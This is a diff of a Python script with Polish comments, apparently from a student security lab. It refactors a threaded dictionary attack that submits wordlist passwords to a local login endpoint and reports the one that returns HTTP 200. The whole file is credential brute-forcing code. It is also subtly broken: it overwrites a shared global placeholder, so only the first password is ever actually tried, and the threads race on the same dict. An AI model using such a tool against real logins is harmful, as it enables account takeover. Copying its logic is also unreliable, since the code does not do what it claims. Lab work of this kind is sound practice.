@@ -10,40 +10,43 @@ from itertools import islice
 
 SLICE_SIZE = 1000
 
+URL = "http://localhost:3000/rest/user/login" #adres URL strony
+WORDLIST_FILE = "lab 12/directory-list-2.3-medium.txt" #ścieżka do słownika haseł
+
+#można dodać nagłowek jesli strona tego wymaga
+HEADERS = {
+
+}
+
+#tworzymy strukturę danych która będzie wysyłana w zapytaniu POST
+POST = {
+    "email": "temp@mail.com",
+    "password": "TARGET"
+}
+
 #funnckja która wykonuje atak słownikowy na podany url
-def brute_force_login(url, username, password):
-    #można dodać nagłowek jesli strona tego wymaga
-    Headers = {
+def brute_force_login(url, password):
 
-    }
-    #tworzymy strukturę danych która będzie wysyłana w zapytaniu POST
-    Post_structure = {
-        "email": username,
-        "password": password
-    }
-
+    for key in POST.keys():
+        if POST[key] == "TARGET":
+            POST[key]=password
+    
     #jeśli nagłowek jest pusty, wysyłamy zapytanie bez nagłówka
-    if Headers == {}:
+    if HEADERS == {}:
         #wysyłamy zapytanie POST z danymi logowania, jesli status code to 200, oznacza ze mamy hasło
-        response = requests.post(url, json=Post_structure)
+        response = requests.post(url, json=POST)
         if response.status_code == 200:
             return password
     else:
         #wysyłamy zapytanie POST z danymi logowania, jesli status code to 200, oznacza ze mamy hasło
-        response = requests.post(url, json=Post_structure, headers=Headers)
+        response = requests.post(url, json=POST, headers=HEADERS)
         if response.status_code == 200:
             return password
     return None
 
 if __name__ == "__main__":
-    
-    target_url = "http://localhost:3000/rest/user/login" #adres URL strony
-    wordlist_file = "lab 12/directory-list-2.3-medium.txt" #ścieżka do słownika haseł
-    username = "temp@mail.com" #nazwa użytkownika/email
-    
     try:
-        with open(wordlist_file, 'r') as wordlist:
-            
+        with open(WORDLIST_FILE, 'r') as wordlist:
             #otwieramy pulę wątków, max_workers=20 oznacza że jednocześnie będzie sprawdzanych 20 haseł
             with ThreadPoolExecutor(max_workers=20) as executor:
                 
@@ -67,7 +70,7 @@ if __name__ == "__main__":
                         password = password.strip()
                         
                         #dodajemy zadanie sprawdzenia hasła do puli wątków
-                        future = executor.submit(brute_force_login, target_url, username, password)
+                        future = executor.submit(brute_force_login, URL, password)
                         futures.append(future)
                     
                     #sprawdzamy wyniki z puli wątków, i jesli któreś hasło jest poprawne, wyświetlamy je i przerywamy skanowanie
